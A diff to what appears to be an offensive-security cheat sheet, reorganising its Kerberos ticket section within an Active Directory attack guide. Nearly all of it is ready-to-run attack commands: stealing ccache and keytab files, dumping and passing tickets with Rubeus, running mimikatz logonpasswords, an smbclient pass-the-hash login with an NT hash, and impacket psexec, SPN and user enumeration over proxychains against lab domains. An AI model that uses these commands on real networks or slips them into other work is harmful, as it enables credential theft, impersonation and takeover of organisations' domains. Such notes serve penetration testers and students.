@@ -2270,20 +2270,99 @@ mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonpasswords
 ```
 
-##### Credential Cache
+#### Kerberos Ticket & Cache Abuse
 
+Obtain Kerberos tickets from Windows or Linux systems. 
+
+For Linux, check `/tmp/krb5*`, `/etc/*.keytab`, and read `/etc/krb5.conf`.
+
+To convert between a Kerberos ticket and a ccache file, use impacket:
 ```
-# obtain
-$ proxychains scp -r root@10.0.0.23:/tmp/krb5cc_613516103_maDBOTO
-[...]
-
 # convert
-$ ticketConverter.py /tmp/krb5cc_613516103_maDBOTO /tmp/stolenticket.kirbi
-[...]
+$ ticketConverter.py /tmp/krb5cc_613516103_maDBOTO /tmp/stolen_ticket.kirbi
 
-# impersonate
-beacon> kerberos_ticket_use /tmp/stolenticket.kirbi
+$ ticketConverter.py stolen_ticket.kirbi stolen_ticket.ccache
 ```
+
+For Windows, use something like ``Rubeus``.
+
+```
+# grab base64 encoded ticket
+> Rubues tgtdeleg
+
+> execute-assembly /tmp/Rubeus.exe dump /nowrap
+```
+
+Import in Linux
+
+```
+# install resources
+$ apt install krb5-user -y
+
+# export
+$ export KRB5CCNAME=/tmp/krb5cc_minenow
+
+# verify
+$ klist
+
+# renew
+$ kinit -R
+
+# destroy
+$ kdestroy
+
+# Request a service ticket
+$ kvno MSSQLSvc/DC01.corp1.com:1433
+```
+
+Import in Windows
+
+```
+# using rubeus
+> .\Rubeus.exe ptt /ticket:<base64 or filepath>
+```
+
+#### Leverage Kerberos tickets from Linux
+
+Leverage Kerberos to interact with the domain. Add domain controller to /etc/hosts & use proxychains to come from correct source. 
+
+Use `-k` and `--no-pass` with impacket tools.
+
+```
+# ldap
+ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
+
+# smb
+smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
+proxychains smbclient '\\10.9.0.200\share$' -U 'vault.local/bob%357e1382f274f51526f1e263cef0f67d' --pw-nt-hash
+
+# impacket get AD users
+proxychains GetADUsers.py -all -k -no-pass -dc-ip 172.16.83.168 complyedge.com/pete
+
+# impacket get SPNs
+proxychains GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
+
+# impacket psexec
+proxychains psexec.py pete@dmzdc01.complyedge.com -k -no-pass
+```
+
+##### Pass the Ticket (PTT) Remote Desktop Protocol (RDP)
+
+```
+# setup the domain
+> ksetup /addkdc VAULT.LOCAL dc1.vault.local
+> ksetup /addrealmflags VAULT.LOCAL tcpsupported
+
+# pass the ticket
+> .\rubeus.exe ptt /ticket:c:\users\attacker\desktop\domain_admin.kirbi
+
+# rdp
+> mstsc /remoteGuard /v:dc1.vault.local
+```
+
+##### Resources
+- https://github.com/sosdave/KeyTabExtract
+- https://packages.debian.org/stretch/krb5-user
 
 ### Local Administrator Password Solution (LAPS)
 
@@ -2909,121 +2988,6 @@ linuxvictim
 ansibleadm@controller:~$ ansible victims -a "whoami" --become
 linuxvictim | CHANGED | rc=0 >>
 root
-```
-
-### Linux Kerberos
-
-#### Keytab
-
-Keytab files contain the Kerberos principal name and encrypted keys. They allow for a script or user to auth to Kerberos without a password. Commonly used in cron jobs. 
-
-Steal keytab
-
-```
-kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
-```
-
-##### Resources
-- https://github.com/sosdave/KeyTabExtract
-- https://packages.debian.org/stretch/krb5-user
-
-#### Credential Cache File Basics
-
-##### TGT Delegation
-
-Get Kerberos ticket without username/password
-
-```
-# grab base64 encoded ticket
-> Rubues tgtdeleg
-
-# convert
-$ base64 -d user.b64 > user.ticket
-
-# convert ccache
-$ ticketConverter.py user.ticket user.cache
-```
-
-Search for credential cache file
-
-```
-env | grep KRB5CCNAME
-```
-
-Request a Kerberos ticket-granting-ticket (TGT)
-
-```
-kinit # enter password
-```
-
-List tickets currently stored in the user's credential cache
-
-```
-klist
-```
-
-Discard all cached tickets
-
-```
-kdestroy
-```
-
-Renew within renewal timeframe
-
-```
-kinit -R
-```
-
-#### Import Credential Cache Files
-
-Set KRB5CCNAME evn var
-
-```
-export KRB5CCNAME=/tmp/krb5cc_minenow
-```
-
-Request a service ticket
-
-```
-kvno MSSQLSvc/DC01.corp1.com:1433
-```
-
-#### Leverage Kerberos tickets from Linux
-
-Leverage Kerberos to interact with the domain. Add domain controller to /etc/hosts & use proxychains to come from correct source. 
-
-Use `-k` and `--no-pass` with impacket tools.
-
-```
-# Install Kerberos linux client utilities
-apt install krb5-user
-
-# ldap
-ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
-
-# smb
-smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$
-proxychains smbclient '\\10.9.0.200\share$' -U 'vault.local/bob%357e1382f274f51526f1e263cef0f67d' --pw-nt-hash
-
-# impacket get AD users
-proxychains GetADUsers.py -all -k -no-pass -dc-ip 172.16.83.168 complyedge.com/pete
-
-# impacket get SPNs
-proxychains GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
-
-# impacket psexec
-proxychains psexec.py pete@dmzdc01.complyedge.com -k -no-pass
-```
-
-#### Ticket Convert
-
-```
-root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
-Converting ccache => kirbi
-
-# need to base64 decode first
-root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
-Converting kirbi => ccache
 ```
 
 ## MSSQL
